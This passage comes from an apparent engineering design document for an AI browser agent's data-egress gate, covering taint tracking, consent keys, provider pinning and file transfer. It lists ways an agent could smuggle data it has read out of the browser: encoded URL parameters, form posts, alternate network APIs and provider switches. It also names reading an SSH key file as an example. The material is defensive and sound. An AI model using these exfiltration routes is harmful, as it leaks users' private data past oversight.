vectors rather than destinations; `canonicalUrlIdentity` now returns `null`
for every blocked scheme, and the gate denies.

### Deviations from the frozen contract

**Provider binding, added.** §4K said every transfer is evaluated against the
consent key. Taken literally that prompts on every model turn — dozens of
times per task, for the provider the user configured and chose when starting
the task. A prompt that fires on every ordinary action is dismissed rather
than read, which makes the control weaker in practice.

A task therefore **pins** its provider destination on the first request and
compares every later one against it. The value comes from user configuration
and never from model output, so the model cannot steer a task elsewhere; a
switch to any other provider, endpoint origin, port or **model** fails the
comparison and falls through to consent. This implements "provider switching
re-evaluates" directly. It is a deviation and is recorded as one.

> **Corrected after release verification (V-1).** The first implementation
> pinned only the endpoint identity, so a model change took the
> `PROVIDER_BOUND` fast path and never reached the consent lookup — an
> invariant this document stated and the code did not enforce. The model is
> now part of the pin, and the regression test instruments `ConsentStore.find`
> to prove the consent path is re-entered rather than only checking the
> returned verdict.

**Carrier applies only to URL-bearing channels.** A provider or connector
request sends its payload deliberately, so grading the container says nothing.
Treating `carrier === 'none'` as "cannot convey" for those channels would have
allowed every provider request unconditionally — an adversarial test caught
exactly that during the build.

**Consent is required by the exfiltration verdict, not by carrier alone.**
Carrier answers "can this convey?"; the exfiltration verdict answers "is there
foreign private data?". Consent needs both. This is why writing a page's own
content back to that same page does not prompt: the origin already holds it.

### Known limitations

| Limitation                                | Effect                                                                                                                                    |
| ----------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `observedUrls` is not yet populated       | a link the page displayed grades `high`, not `none`, so this can only add confirmations, never remove one                                 |
| Interception covers the worker scope only | content scripts and the page world are unreachable from it; this is intrinsic to MV3 and is why content scripts stay message-passing only |
| Consent grants are not persisted          | a restart re-asks, deliberately                                                                                                           |
| CSP `connect-src` still unusable          | provider base URLs are user-configurable                                                                                                  |
| Web AI channel defined but unimplemented  | D4 and D5 remain gated                                                                                                                    |
| A click follows a page-supplied URL       | permitted by design: the model did not compose the URL, so it carries nothing the task read; a model-composed URL is the blocked case     |

### Evidence

| Claim                                         | Test                                              |
| --------------------------------------------- | ------------------------------------------------- |
| Three-state taint, monotone, fails closed     | `tests/security/taint-state.test.ts` (29)         |
| Persistence, concurrency, restart, damage     | `tests/security/taint-persistence.test.ts` (24)   |
| Salt recovery, epochs, evidence verifiability | `tests/security/taint-persistence.test.ts`        |
| Adversarial gate, consent, carrier, V-1       | `tests/security/egress-gate.test.ts` (47)         |
| Provider transport conformance (V-5)          | `tests/security/provider-transport.test.ts` (15)  |
| Network interception, defence in depth (V-5)  | `tests/security/network-interceptor.test.ts` (13) |
| Real-browser egress, receiving-side zero hits | `tests/e2e/egress.spec.ts` (16)                   |

The real-browser tests assert on the **receiving** side: a blocked transfer
must leave zero requests at a collector server on its own origin. Asserting
that a tool returned BLOCK would prove only that the extension said no, not
that nothing left the browser.

Receiving-side coverage (V-3): blocked navigation with a tainted query,
fragment, path segment, mixed URL, percent-encoded, base64-wrapped and
JSON-wrapped value; a blocked cross-site form `POST`; a blocked provider
request with no retry reaching the provider; and alternate primitives
(`XMLHttpRequest`, `WebSocket`, `EventSource`, bare `fetch`) attempted inside
the real worker. Positive controls run beside them — a clean navigation, a
same-site form submission and an approved transfer all really happen — so a
suite that simply blocked everything could not pass.

**A test that misdescribed itself was replaced (V-4).** One case was named for
a cross-site form write and performed a navigation with a fragment. In a
security suite that is worse than a gap, because it reports coverage that does
not exist. There is now a real form, a real `POST`, and an assertion on method
and body at the receiving end.

---

## 4N. Wave E — file transfer, delivered

Upload and download now exist, built as four separate operations rather than
one. This section records what was built, what building it found, and what a
browser will not let an extension do.

### The four operations

|     | Operation                     | Where                  | Security event                         |
| --- | ----------------------------- | ---------------------- | -------------------------------------- |
| A   | The user selects a local file | side panel file picker | the only route to local bytes          |
| B   | The extension reads it        | panel → worker         | task-derived data appears; taint added |
| C   | It is put into a page input   | content script         | **the egress**                         |
| D   | The site transmits it         | the page's own submit  | an ordinary, already-gated action      |

`files.select` is A and B, `browser.attach_file` is C, and D is reached
through the existing tools. Collapsing these into one "upload" would have
gated only the last of them.

**C is the boundary, not D.** A page can read `input.files` with its own
JavaScript the instant they are set, so waiting for a form submit would gate
an event that had already happened. This is not the same as assuming a submit
is harmless — it is not gated _as the file transfer_ because by then the
transfer is done.

### Modules added

| Module                                    | Role                                                          |
| ----------------------------------------- | ------------------------------------------------------------- |
| `src/files/file-model.ts`                 | the §68 record, size ceilings, taint sources, accept matching |
| `src/files/download-safety.ts`            | filename validation, independent of Chrome's own              |
| `src/files/file-store.ts`                 | memory-only, task-scoped staging                              |
| `src/files/download-port.ts`              | the seam over `chrome.downloads`                              |
| `src/background/file-broker.ts`           | user-mediated selection, mirroring `PermissionBroker`         |
| `src/tools/files/file-tools.ts`           | the three tools                                               |
| `src/sidepanel/components/FilePrompt.tsx` | the picker, and the whole local-file capability               |

### Local access is absent, not guarded

There is no filesystem API, no `file://` host permission, and no tool that
takes a path. A model cannot express "read `~/.ssh/id_rsa`" even as a
proposal, because `files.select` accepts a `purpose` and nothing else. The
capability being absent rather than gated is what makes the guarantee cheap to
verify: the security tests assert that no tool schema contains a path field at
all.

### Defects this wave uncovered

**D-FILE-1 — a file input was reported to the model as a `textbox`.**
`FIXED`. `roleOf` fell through to the `default` branch for
`input[type=file]`, so the model was told to type a path into it — an action
that cannot work and fails confusingly. It now has its own `file` role, and
reports `accept` and `multiple`.

**D-FILE-2 — a hidden file input got no handle at all.** `FIXED`. The page
snapshot skips invisible elements, and the standard way to build an upload
control is a styled button beside an `input[type=file]` the page has hidden.
Uploads would therefore have worked on almost no real form. File inputs are
now the one exception to the visibility filter, reported honestly as
`visible: false`; every other hidden element is still excluded, which real
Chromium verifies because jsdom has no layout to discriminate with.

**D-FILE-3 — `siteOf` was being handed a whole URL.** `FIXED`. It takes a
hostname; given a URL it returns the URL unchanged, which would have travelled
as a taint "site" and as an audit origin — neither matching anything, quietly
weakening both. Found by a test asserting the recorded origin.

### What jsdom could not prove

Two claims were moved to real Chromium rather than left looking tested:

- jsdom's `getBoundingClientRect` returns zeros, so **every** element reads as
  invisible and "a hidden file input still gets a handle" would have passed
  without discriminating anything.
- jsdom implements no `DataTransfer`, which is the only way to populate
  `input.files`. The unit tests use a documented stand-in and say so; the real
  assignment is exercised in `tests/e2e/file-transfer.spec.ts`.

### Permissions

**No manifest permission was added.** `downloads` was already declared
optional and stays optional: not granted at install, not requestable by the
agent, turned on by a person in Settings under their own gesture. Uploads need
no permission at all. `<all_urls>` remains absent and `all_frames` remains
`false`.

### Platform limitations, stated rather than worked around

**BLOCKED — BROWSER/PLATFORM LIMITATION: synthesised events are not trusted.**
The `change` event dispatched after an attachment has `isTrusted: false`,
because nothing an extension synthesises is trusted. A site that requires a
trusted event will ignore it. There is no way around this from an extension,
so the assignment is verified afterwards and a failure is reported rather than
assumed away.

**BLOCKED — BROWSER/PLATFORM LIMITATION: file inputs in cross-origin iframes.**
Out of reach, because the content script runs only in the top frame. Widening
`all_frames` would inject into every frame of every page — a materially larger
surface than this feature justifies, and the same reasoning that removed
`<all_urls>` in Stage 2.

**BLOCKED — BROWSER/PLATFORM LIMITATION: a granted-permission download E2E.**
`downloads` is granted by a human gesture in Settings, which a headless
profile cannot produce. The refusal path runs end to end in a real browser;
the granted path is covered by unit and integration tests against the download
port. P-011 is recorded as PARTIAL for this reason and no other.

### Web provider boundary

Unchanged. **D4 = GATED. D5 = GATED.** Nothing here uploads to an AI website,
reads a model reply from a DOM, or treats a rendered interface as an API. The
file architecture is provider-neutral, which is what prepares it for a future
web provider without opening one.

---

## 4M. Wave C — API provider expansion, delivered

Three API providers now ship behind one canonical interface, and one
conformance suite runs against all of them. This section records what was
built, what building it discovered, and what remains externally blocked.

### Modules added

| Module                                   | Role                                                      |
| ---------------------------------------- | --------------------------------------------------------- |
| `src/providers/adapters/anthropic.ts`    | Messages API: top-level system, content blocks, typed SSE |
| `src/providers/adapters/gemini.ts`       | generateContent: contents/parts, header auth, `alt=sse`   |
| `src/providers/core/provider-http.ts`    | shared SSE reader, error scaffolding, egress requirement  |
| `src/providers/core/capability-guard.ts` | refuses an unsupported capability instead of dropping it  |
| `src/providers/core/provider-error.ts`   | the nine-category provider error taxonomy                 |

### What is deliberately not shared

Only the parts that are genuinely identical were extracted: reading an SSE
body, classifying a dropped connection, refusing a request with no security
context. Translation was not. The three wire formats differ in the places that
matter most to an agent loop — where the system prompt goes, whether a tool
result is a message or a block, whether a tool call has an id at all — and a
shared translator with per-provider flags would lose information quietly.
`docs/provider-architecture.md` tabulates the differences.

The sharpest one: **Gemini has no tool call ids.** Calls and responses are
correlated by function name. The canonical model requires an id so a result can
be attributed to the call that produced it, so the adapter synthesises one and
sends the name back — the one place the canonical model carries more than a
provider does.

### Defects this wave uncovered

**D-PR-1 — every provider's capability probe shared one pseudo-task id.**
`FIXED`. `managementContext` used the literal task id `provider-management`
for all providers, and the egress gate pins a task to one provider
destination. So whichever provider probed first became the only one that ever
could: connecting a second provider failed its capability check with a policy
refusal, and the task that followed reported "this model does not support tool
calling" — a wrong answer to a question that was never asked. Probe identity is
now scoped per provider and model. Nothing is given up: the pin protects a
task's data from reaching a second destination, and a probe has no task behind
it and a fixed body with nothing in it. Every other gate check still runs on
every probe. Found by the real-Chromium switching test, not by any unit test.

**D-PR-2 — a refusal by the egress gate was reported as a network error.**
`FIXED`. Adapters wrap the transport call in a try/catch, so an
`EgressDeniedError` arrived looking like any other thrown error and was
classified `NETWORK_ERROR` — which is **retryable**. The runtime would have
re-sent a refused request up to the retry limit, against a gate that would
never say yes, and told the user their network was at fault. Refusals now
carry a marker, classify as `transport_blocked`, and are terminal.

**D-PR-3 — the retry policy could not express the difference between a 5xx and
an unparseable reply.** `FIXED`. `decideRetry` read the error code alone, and
both conditions surface as `MODEL_ERROR`. A provider 5xx was therefore never
retried. The runtime now calls `decideRetryFor`, which honours the
classification the adapter already made; the backoff is unchanged.

**D-PR-4 — 401 and 403 were reported identically.** `FIXED` in the reference
adapter as part of normalisation. "Your key is wrong" and "your key is fine but
not allowed here" need different fixes, and reporting both as the former sends
the user to change something that was correct.

### Security review of the new adapters

| Question                                 | Finding                                                                                      |
| ---------------------------------------- | -------------------------------------------------------------------------------------------- |
| Direct `fetch` anywhere?                 | No. Lint forbids it in `src/providers/**`; the default transport refuses.                    |
| Credential in a URL?                     | No. Both new adapters use headers; Gemini refuses a base URL with a query string at all.     |
| Credential in a destination identity?    | No. Identity is `providerId@origin`; asserted per provider in the conformance suite.         |
| Credential in logs, audit or evidence?   | No. Asserted in real Chromium against the service worker's own console output.               |
| Credential in a thrown error?            | No. Response bodies stay in `technicalDetails`; `userMessage` and `message` are asserted.    |
| Can a retry bypass authorization?        | No. Each attempt re-enters `generate`, and so the gate. A refusal is terminal (D-PR-2).      |
| Can streaming bypass it?                 | No. Same transport, same context; a mid-stream error ends the stream rather than completing. |
| Can vision bypass it?                    | No. There is no image-specific route; image bytes ride the same gated request.               |
| Can a tool call bypass the ToolRegistry? | No. Cross-provider tests run each provider's tool call through the real registry.            |
| Does model output gain trust?            | No. Tool calls remain `MODEL_OUTPUT_API` and pass schema, risk, policy, permission, egress.  |

Gemini's documented `key=` query parameter is the one authentication mechanism
that would have created a new destination-identity problem. It is not used. The
header form is, and `connect()` rejects a base URL that could smuggle a key in,
because the gate derives a destination identity from the request URL and that
identity reaches consent keys, audit records and evidence.

The plaintext rule was made uniform across all three adapters: https required,
loopback excepted. The rule exists so a key does not cross a network in the
clear, and loopback crosses none — a local gateway speaking any of these three
protocols is a real deployment, and the reference adapter already allowed it.

### Web provider boundary

Unchanged. **D4 = GATED. D5 = GATED.** No web provider is registered, so none
is selectable; the real-Chromium test asserts that the registry offers three
providers and that all three are `kind: 'api'`. Nothing in this wave reads a
model reply from a DOM, submits a prompt to a web UI, or treats a rendered
interface as an API.

### What remains externally blocked

**LIVE PROVIDER E2E = BLOCKED — PROJECT-OWNED CREDENTIALS NOT CONFIGURED.**

No request in this repository has reached a commercial provider. Every test
runs against a local server implementing the provider's documented wire
format, in-process or over real sockets in real Chromium. That is an external
environment limitation, not a code failure and not a missing test: the
trajectories exist and would run unchanged against a configured endpoint.

Two further claims are **not** made: no Chrome Web Store policy verification,
and no provider terms verification. §87's per-provider acceptance runs need
project-owned credentials before they can be executed or recorded.

---

## 4K. B2 Final Implementation Contract — frozen

The engineering contract for the B2 pass. Everything here is **ENGINEERING
DESIGN** unless marked `VERIFIED IN CODE`. Nothing in it is implemented.

### Authoritative invariant

> No outbound data transfer containing task-, page-, tool-, model- or
> user-derived data may occur unless that transfer has passed the centralized
> egress authorization gate. The gate fails closed whenever provenance, taint
> state, destination identity, consent state or the policy decision is UNKNOWN
> or unavailable.

### C-1. Taint cannot be tracked through the model — the decisive finding

`VERIFIED IN CODE`: tool arguments are produced **entirely by the model**.
`agent-runtime.ts:257` forwards `call.arguments` from the provider response to
`registry.dispatch`, and `tool-registry.ts:140` validates them against a Zod
schema and nothing else. No provenance attaches to an argument, and none can:
the model is an opaque transformer that may paraphrase, encode, translate,
split or re-derive any value it was shown.

Therefore **value-level taint tracking across the model boundary is
impossible**, and any design that attempts it is a false control. The contract
takes the only sound alternative:

> **Taint is a monotone property of the task, not of a value.** Every argument
> the model produces after the task has acquired taint inherits the task's
> entire taint set.

This resolves the propagation questions as a class rather than case by case:

| Question                                           | Answer under C-1                                                                                               |
| -------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| Partial URL tainted?                               | The whole URL is tainted; parts are not separable                                                              |
| Base64 / JSON / percent-encoded value?             | Irrelevant — no value inspection occurs, so no encoding evades it                                              |
| Model paraphrases tainted content?                 | Covered — task taint already applies                                                                           |
| Concatenation / transformation?                    | Covered — the result is model output from a tainted task                                                       |
| Taint cannot be traced?                            | It never is traced; the task-level set is authoritative                                                        |
| Provenance attached to value, argument or context? | **Execution context**, carried on the task. Values and arguments carry none, because neither can be trusted to |

Value-level provenance survives only where a value never passes through the
model — tool result to tool argument passthrough — which does not exist today.

### C-2. Carrier capacity — keeping fail-closed usable

C-1 makes every post-read navigation nominally an egress. Without refinement
the agent would prompt on every click. The gate therefore grades the **carrier
capacity** of a browser action: how much task-derived data it can convey.

```text
assessCarrier(action, observedLinks) -> 'none' | 'low' | 'high'

'none'  exact match to a URL observed verbatim in content already read,
        with no added query, fragment or path segment
'low'   same-origin navigation, no query or fragment
'high'  any query string, fragment, added path segment, form value,
        upload, clipboard write, or DOM injection
```

**Carrier assessment is routing metadata. It is never an authorization.**
`assessCarrier` returns a carrier class and nothing else; it has no allow, deny
or confirm in its return type, and no caller may branch to a transfer on its
result. It selects _which checks run_, never _whether the transfer happens_.

```text
carrier assessment -> required-check set
                   -> destination resolution
                   -> egress policy
                   -> consent (when the check set requires it)
                   -> evidence
                   -> authorization decision
                   -> transfer
```

Every class still terminates in the gate:

| Carrier  | Checks required                               | Who authorizes |
| -------- | --------------------------------------------- | -------------- |
| `'none'` | destination + policy + evidence               | **the gate**   |
| `'low'`  | destination + policy + evidence               | **the gate**   |
| `'high'` | destination + policy + **consent** + evidence | **the gate**   |

`'none'` skips the _consent_ check. It does **not** skip the gate, the policy
evaluation, the destination resolution or the evidence record. These readings
are explicitly prohibited, and code matching any of them is a defect:

```text
PROHIBITED:  carrier === 'none'   -> transfer
PROHIBITED:  carrier === 'low'    -> transfer
PROHIBITED:  carrier !== 'high'   -> transfer
PROHIBITED:  carrier === 'static' -> transfer      (no such class exists)
```

An unparseable URL or a missing observed-link set yields `'high'`.

### C-3. The single gate

One authorization point. Five concepts stay separate and are **not** merged:

| Concept                       | Question                                | Owner                     |
| ----------------------------- | --------------------------------------- | ------------------------- |
| Tool risk                     | how damaging is this action?            | `classify` + policy       |
| Destination authorization     | may we talk to this destination at all? | origin/endpoint allowlist |
| **Data egress authorization** | may _this data_ go _there_?             | **the gate**              |
| User consent                  | has the user approved this transfer?    | consent store             |
| Provider authentication       | who is the counterparty?                | provider registry         |

```text
authorizeEgress(request) -> EgressDecision        // the only entry point

request = { taskId, channel, destination, carrier, payloadMeta, purpose }
```

Sequence, identical for all five flows — **transfer never precedes decision**:

```text
source -> resolve taint (task, authoritative)
       -> resolve destination identity (ACTUAL, from the primitive)
       -> policy evaluation
       -> consent evaluation
       -> evidence record written
       -> transfer
```

| Flow                                   | Gate call site                                    |
| -------------------------------------- | ------------------------------------------------- |
| A. API provider request                | guarded fetch, before `fetchImpl`                 |
| B. Navigation with tainted query       | `navigate` classify -> gate, before `tabs.update` |
| C. Form submission                     | `type` with `submit`, before `callContent`        |
| D. Click causing navigation/submission | `click`, carrier-assessed, before `callContent`   |
| E. Web AI DOM injection (future, D4)   | same gate, no second path                         |

### C-4. Provider fetch guarantee

`VERIFIED IN CODE`: `fetchImpl` is a constructor parameter
(`openai-compatible.ts:89`); all four network calls route through it
(`:166, :221, :246, :270` — models, doctor, generate, stream); the sole
construction site is `openAICompatibleFactory.create()` (`:678`). Retries
re-enter `generate`/`stream`, so they are covered by construction.

> **Every external provider network operation uses the guarded provider fetch.**

Enforcement, in order of strength:

1. **Construction** — the registry injects the guarded fetch when it calls
   `factory.create()`. An adapter cannot opt out; it has no other transport.
2. **Static** — `no-restricted-globals` extended to `fetch`, `XMLHttpRequest`,
   `WebSocket`, `EventSource`, `sendBeacon` outside the egress module. Extends
   the existing `eval` precedent (`eslint.config.js:42`). Build fails.
3. **Runtime** — the worker entry replaces those globals with a wrapper that
   denies when no egress context is active. Defence-in-depth.
4. **Test** — a conformance test asserts that every registered factory produces
   an adapter that performs no network call when handed a fetch that throws,
   catching a future adapter that smuggled in its own transport.

Compile-time prohibition of `globalThis.fetch` is not achievable in TypeScript;
layers 2-4 are the substitute and are stated as such.

### C-5. Taint states — frozen

```text
type TaintState =
  | { kind: 'KNOWN_UNTAINTED' }
  | { kind: 'TAINTED'; sources: readonly TaintSource[] }
  | { kind: 'UNKNOWN'; reason: string }
```

| Event                          | Result                                                     |
| ------------------------------ | ---------------------------------------------------------- |
| Task creation                  | `KNOWN_UNTAINTED` — see the construction-point table below |
| Tool returns taint             | append -> `TAINTED`                                        |
| Serialization                  | structural; state preserved                                |
| Deserialization, field absent  | `UNKNOWN('field-absent')`                                  |
| Deserialization, malformed     | `UNKNOWN('malformed')`                                     |
| Legacy record (`taint: []`)    | `UNKNOWN('legacy')` — **never** `KNOWN_UNTAINTED`          |
| Worker eviction / task restart | whatever was persisted; unreadable -> `UNKNOWN`            |
| Provider switch                | unchanged                                                  |
| Task completion / cancellation | unchanged; the record is not cleared                       |

Permitted transitions: `KNOWN_UNTAINTED -> TAINTED`, `TAINTED -> TAINTED` (grow
only), `* -> UNKNOWN`. Prohibited: anything producing `KNOWN_UNTAINTED` outside
task creation, and any removal of a source.

The field is named **`taintState`**, not `taint`. Reusing `taint: []` would make
"never written" indistinguishable from `KNOWN_UNTAINTED` — the exact confusion
D-EG-4 is.

**Trusted construction points — the complete list.** Every `KNOWN_UNTAINTED`
state must trace to one of these, with the reason recorded. There are no
others, and no implicit path creates one.

| Candidate                             | Trusted?      | Reason                                                                                       |
| ------------------------------------- | ------------- | -------------------------------------------------------------------------------------------- |
| Task creation                         | **Yes**       | The task has read nothing. The only construction point that occurs in practice               |
| Static extension-controlled data      | **Yes**       | Tool schemas, policy tables, UI strings — compiled into the bundle, never externally sourced |
| System-controlled internal data       | **Yes**       | Task ids, timestamps, counters — generated by extension code from no external input          |
| User-originated data (task objective) | **Qualified** | untainted, but not thereby safe — see below                                                  |
| Anything else                         | **No**        | —                                                                                            |

**User-originated data is not automatically safe, and the contract does not
treat it as such.** The objective text is `KNOWN_UNTAINTED` for _taint_
purposes — it is not externally derived, so it adds no source — but that says
nothing about its _sensitivity_. A user may paste a password, a token or a
customer record into an objective. Two controls remain in full force:

- `payloadContainsSecret` (`exfiltration-guard.ts:56`) `VERIFIED IN CODE` blocks
  credential-shaped payloads **unconditionally**, at any taint state, to any
  destination. `KNOWN_UNTAINTED` grants no exemption from it.
- Sensitivity classification is independent of taint. The objective is
  classified `internal`, never `public`.

> Taint answers "where has this task been?". Sensitivity answers "how bad is it
> if this leaks?". `KNOWN_UNTAINTED` answers the first question only, and is
> never a reason to skip the second.

The architecture supports **task-level** taint only, deliberately, per C-1.
Implementation must not introduce a value-level variant as a convenience.

### C-6. Monotonicity

No operation reduces taint. Summarisation, truncation, redaction,
serialization, deserialization, model transformation, provider transformation,
context compaction, task resume, tab change, frame change and provider change
all preserve it — each changes representation, never lineage.

**The single trusted construction rule:** a value may be `KNOWN_UNTAINTED` only
when produced by extension code from inputs that are themselves
`KNOWN_UNTAINTED`, with no external read in between. In practice that is task
creation and nothing else. There is no declassification operation, no operator
override, and no "the model summarised it so it is clean".

### C-7. Consent — frozen

```text
ConsentKey = {
  taskId,
  destination: canonicalDestinationId,   // scheme://host[:port] lowercased,
                                          // or providerId@endpointOrigin
  taintSignature,                         // SHA-256 over the canonical,
                                          // sorted, deduplicated source list
  sensitivityCeiling,                     // highest DataSensitivity at grant
  channel,                                // ai_provider | page_write | navigation | ...
}
```

Canonicalization uses `parseOrigin` (`origin-validator.ts:115`)
`VERIFIED IN CODE`: hostname lowercased, `origin` carries scheme, host and port.
**Taint signature — canonical serialization, frozen.** A `|`-joined string is
ambiguous: a `sourceType` containing `|` could forge a collision with a
different logical set. The format is therefore length-prefixed and versioned.

```text
signature = SHA-256( "tsig/1\n" + join("\n", entries) )

entry  = len(sourceType) ":" sourceType
         len(site)       ":" site
         len(sensitivity)":" sensitivity     // lengths in UTF-8 code units
```

| Rule                 | Decision                                                                                                                                                    |
| -------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Ordering             | byte-wise ascending on the encoded entry — stable, locale-independent                                                                                       |
| Duplicate removal    | exact duplicates removed **after** encoding                                                                                                                 |
| Absent `site`        | encoded as length `0`, distinct from the literal string `"0"`                                                                                               |
| Null / undefined     | normalised to absent, then encoded as length `0`                                                                                                            |
| Empty string         | length `0` — identical to absent **by design**: neither carries information                                                                                 |
| Unicode              | NFC-normalised before length is computed                                                                                                                    |
| Case                 | `site` and any origin lowercased (`parseOrigin` already does) `VERIFIED IN CODE`; `sourceType` and `sensitivity` are closed enumerations, compared verbatim |
| Sensitivity ordering | not sorted separately — it is a field inside the entry                                                                                                      |
| Versioning           | `tsig/1` prefix; a format change bumps it and invalidates every existing grant, which is the safe direction                                                 |

Length-prefixing makes the encoding injective: the same logical set always
produces one signature, and two different logical sets cannot collide through
delimiter ambiguity. No canonical-JSON library is introduced.

**Tab and frame are not in the key.** They are properties of the _source_, and
they already enter the key through the taint signature — a read from a new tab
adds a source and changes the signature. Putting them in the key as well would
invalidate grants for navigation within one origin without adding security.
Origin _is_ present, as the destination.

Purpose is carried as evidence metadata, not as a key field: it is model-supplied
text and cannot be relied on to constrain anything.

Grant is void on: any taint growth, sensitivity increase, destination change,
provider or model change, channel change, logout or session expiry, explicit
revocation, policy change, task cancellation or restart. Expiry is a backstop.

**Adversarial consent cases — expected results**

| #   | Scenario                                                             | Expected                                          |
| --- | -------------------------------------------------------------------- | ------------------------------------------------- |
| 1   | Grant for page A; second, more sensitive page read; same destination | **BLOCK** — signature changed                     |
| 2   | Grant for provider X; provider switched to Y                         | **BLOCK**                                         |
| 3   | Grant for model M; model switched within X                           | **BLOCK**                                         |
| 4   | Grant for `https://a.example`; transfer to `https://b.example`       | **BLOCK**                                         |
| 5   | Grant for `https://a.example:443`; transfer to `:8443`               | **BLOCK** — port is in the canonical id           |
| 6   | Grant in task T1; task T2 same destination, same sources             | **BLOCK** — taskId differs                        |
| 7   | Same task, same destination, no new read, second transfer            | **ALLOW**                                         |
| 8   | Same sources re-added (duplicate)                                    | **ALLOW** — set is deduplicated, signature stable |
| 9   | Grant, then worker eviction, then resume with `UNKNOWN`              | **BLOCK** — fail closed                           |
| 10  | Grant for `ai_provider`; attempt `page_write`                        | **BLOCK** — channel differs                       |
| 11  | Grant, then user revokes                                             | **BLOCK**                                         |
| 12  | Grant at `internal`; payload now `confidential`                      | **BLOCK** — ceiling exceeded                      |

### C-8. Persistence and concurrency

Binding rule, from the verified infrastructure:

> Taint is appended **inside `TaskStore.updateTask`'s mutator**. Never read a
> task, mutate a local object, and call `saveTask` — `saveTask` uses
> `area.set` (`task-store.ts:41`), a blind overwrite that loses concurrent
> updates.

`SerializedStorageArea` + `KeyedMutex` already serialise read-modify-write
(`storage-area.ts:149, 175-182`), `NamespacedStorageArea` delegates
(`:128-131`), and the worker builds every store over it
(`service-worker.ts:54-59`) `VERIFIED IN CODE`. No new locking.

| Condition                   | Behaviour                                                                   |
| --------------------------- | --------------------------------------------------------------------------- |
| Concurrent tool executions  | serialised by the mutex                                                     |
| Concurrent taint additions  | both applied; set union                                                     |
| Duplicate / repeated source | deduplicated; signature unchanged                                           |
| Eviction during update      | transaction completes or never applied; resume reads persisted or `UNKNOWN` |
| Storage write failure       | **PAUSE** the task, surface to the user, no egress                          |
| Missing task record         | **FAIL** the task                                                           |
| Malformed task              | `UNKNOWN` -> fail closed                                                    |

No path continues execution with weaker security state.

### C-9. Egress evidence

New evidence type `EGRESS_DECISION`. `EvidenceReference` already carries id,
type, taskId, toolCallId, sourceTool, createdAt, sensitivity, trust, origin,
label, byteLength and hash `VERIFIED IN CODE` (`evidence-model.ts:24-40`).
Added fields: destination identity, destination origin, provider identity,
channel, decision, policy code, consent reference, taint source ids, carrier
class.

Never recorded: passwords, cookies, API keys, OAuth or session tokens, raw
secrets, raw page content, the full provider request body, full form values.

**The hash is itself a side channel, and the contract addresses it.**
`hashContent` is a bare SHA-256 (`evidence-model.ts:51`). A bare digest of a
low-entropy payload — a six-digit code, an email address, a short form field —
is trivially recovered by brute force, and identical digests across tasks leak
that two payloads matched. Requirement:

> Egress evidence stores `HMAC-SHA256(taskSalt, payload)` where `taskSalt` is
> 32 random bytes generated per task and never written into evidence. Integrity
> and duplicate detection within a task are preserved; cross-task correlation
> and brute-force recovery are not possible.

**Salt lifecycle — frozen.**

| Question                 | Answer                                                                                                           |
| ------------------------ | ---------------------------------------------------------------------------------------------------------------- |
| Created                  | at task creation, `crypto.getRandomValues(new Uint8Array(32))`                                                   |
| Persisted                | on the task record, beside `taintState`, written through the same `updateTask` mutator                           |
| Protected by             | the existing storage controls only — `chrome.storage.local`, extension-origin isolated. Not separately encrypted |
| Survives worker eviction | **Yes** — it is task state, not runtime state                                                                    |
| Survives task resume     | **Yes**                                                                                                          |
| Survives provider switch | **Yes** — unrelated                                                                                              |
| Survives tab switch      | **Yes** — unrelated                                                                                              |
| Changes on task restart  | **No** — a restart is the same task; changing it would break integrity checks on its own evidence                |
| Two tasks comparable?    | **No** — independent salts, so identical payloads produce unrelated digests                                      |

Missing or corrupt salt: **generate a fresh salt, increment `saltEpoch`, record
the epoch on the evidence, and continue.** Digests are comparable within an
epoch and not across epochs, which is a legibility loss, not a security one.

> **A missing or corrupt salt must never fall back to a plain SHA-256.** That
> would silently restore both the brute-force oracle and cross-task linkability
> the salt exists to remove. There is no unsalted path.

**Stated limitation, honestly.** The salt is stored next to the evidence it
protects, so it defends against correlation and brute force by anyone reading
_exported or displayed_ evidence. It does not defend against an attacker with
read access to extension storage — such an attacker holds the salt, and in any
case already holds the task record. Recorded so the control is not credited
with more than it does.

Summaries are drawn from a fixed vocabulary (category, field count, byte
length). Free-text summaries of payload content are prohibited: they reintroduce
the content the hash was meant to replace. Redaction runs over every summary
before it is stored.

### C-10. Web AI forward compatibility

B2 implements no Web AI inference. The gate is channel-parameterised, so a
future `web_ai_provider` channel is a new destination type, not a second
security path. Web AI output remains `untrusted_external_content`, carries the
union of its inputs' taint, and never becomes authorization. D4 and D5 stay
gated.

### C-11. B2 exit gate — binary

PASS requires every row. Planned, mocked, interface-only, untested, or
unit-only where real Chromium is required all count as **NOT PASS**.

| #   | Item                                    | Minimum evidence        |
| --- | --------------------------------------- | ----------------------- |
| 1   | Taint persistence across eviction       | real Chromium           |
| 2   | `UNKNOWN` fails closed                  | unit + real Chromium    |
| 3   | No known egress bypass                  | tests A-P + conformance |
| 4   | Consent isolation                       | unit (cases 1-12)       |
| 5   | Provider routing through guarded fetch  | real Chromium           |
| 6   | Browser-action egress classified        | real Chromium           |
| 7   | Persistence failure -> PAUSE            | real Chromium           |
| 8   | Evidence safety incl. salted hash       | unit                    |
| 9   | Monotonicity holds under all transforms | unit                    |
| 10  | Regression suite green                  | full CI                 |
| 11  | Documentation matches implementation    | review                  |
| 12  | No source/specification contradiction   | review                  |

### C-13. Guardrail lock — browser primitives, navigation classes, UNKNOWN

**Browser-action order, per primitive.** No primitive capable of an externally
observable transfer executes before the gate returns `allow`.

| Primitive                         | Gate call site                            |
| --------------------------------- | ----------------------------------------- |
| `chrome.tabs.create` with a URL   | before the call, in the tab tool          |
| `chrome.tabs.update` with a URL   | before the call, in `chrome-adapter`      |
| `form.requestSubmit` (via `type`) | before `callContent`, in the browser tool |
| Click activation (via `click`)    | before `callContent`, carrier-assessed    |
| Upload (future)                   | before the primitive                      |
| Web AI DOM injection (future, D4) | before the primitive, same gate           |

`BLOCK` means **the external request was never emitted** — not that it was sent
and the result discarded. Real-Chromium tests assert this on the receiving
side: the test site records every inbound request, and a blocked case must show
**zero** hits for the expected path, not a hit that was ignored.

**Navigation classes — "a request happened" is not "data leaked".**

| Form                                            | Classification              | Checks                           |
| ----------------------------------------------- | --------------------------- | -------------------------------- |
| `https://example.com/page` (observed link)      | **no data egress**          | destination + policy + evidence  |
| `https://example.com/page` (not observed)       | **policy evaluation**       | destination + policy + evidence  |
| `https://example.com/search?q=<task-derived>`   | **consent-required egress** | full gate incl. consent          |
| `https://example.com/<task-derived-path>`       | **consent-required egress** | full gate incl. consent          |
